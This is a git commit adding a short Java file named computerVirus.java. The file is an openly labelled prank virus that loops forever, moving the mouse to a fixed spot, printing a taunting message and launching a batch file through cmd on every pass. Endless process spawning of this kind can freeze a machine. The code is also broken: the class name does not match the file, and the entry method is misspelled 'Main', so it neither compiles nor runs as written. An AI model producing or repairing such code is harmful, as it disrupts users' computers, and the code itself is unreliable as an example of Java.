09ae8bbe76f117471b2b511d2fca25a623b7277a
babycreeper189 <63827080+babycreeper189@users.noreply.github.com>
2020-05-17 12:21:30 -0400

    Create computerVirus.java

---
+++ java/sorce/computerVirus.java
@@ -0,0 +1,16 @@
+import java.awt.*;
+
+public class idk {
+    public static void Main(String[] args) throws AWTException {
+        Robot r = new Robot();
+        while(true){
+            int mouseMove1 = 489;
+            int mouseMove2 = 284;
+            r.mouseMove(mouseMove1, mouseMove2);
+            System.out.println("i aM yOuR cOmPUteR aNd i lOvE yOu!");
+            Runtime.
+             getRuntime().
+             exec("cmd /c start \"\" idk.bat");
+        }
+    }
+}
